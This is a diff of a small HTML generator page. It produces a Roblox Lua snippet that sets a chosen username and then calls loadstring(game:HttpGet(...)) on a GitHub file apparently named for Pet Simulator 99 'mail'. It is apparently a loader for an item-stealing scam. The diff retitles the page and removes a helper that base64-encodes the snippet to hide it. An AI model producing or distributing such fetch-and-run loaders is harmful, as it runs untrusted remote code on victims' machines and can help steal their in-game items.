@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Made By Coen, Thanks You!</title>
+<title>RenYT on top</title>
 <style>
   body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
   .container { background-color: white; padding: 20px; border-radius: 8px; display: inline-block; }
@@ -43,17 +43,6 @@
                          'farmui = ' + farmui + '<br>' +
                          'loadstring(game:HttpGet("https://raw.githubusercontent.com/RenYT1/Mail/main/Petsim99/mail"))()';
       document.getElementById("output").innerHTML = outputString;
-    }
-    function generateObfuscatedOutput() {
-      var username = document.getElementById("username").value;
-      var loadingscreen = document.getElementById("loadingscreen").checked;
-      var farmui = document.getElementById("farmui").checked;
-      var outputString = 'Username = "' + username + '"\\n' +
-                         'loadingscreen = ' + loadingscreen + ' \\n' +
-                         'farmui = ' + farmui + '\\n' +
-                         'loadstring(game:HttpGet("https://raw.githubusercontent.com/RenYT1/Mail/main/Petsim99/mail"))()';
-      var encodedString = btoa(outputString); // Base64 encode
-      document.getElementById("obfuscatedOutput").innerText = encodedString;
     }
   </script>
 </body>
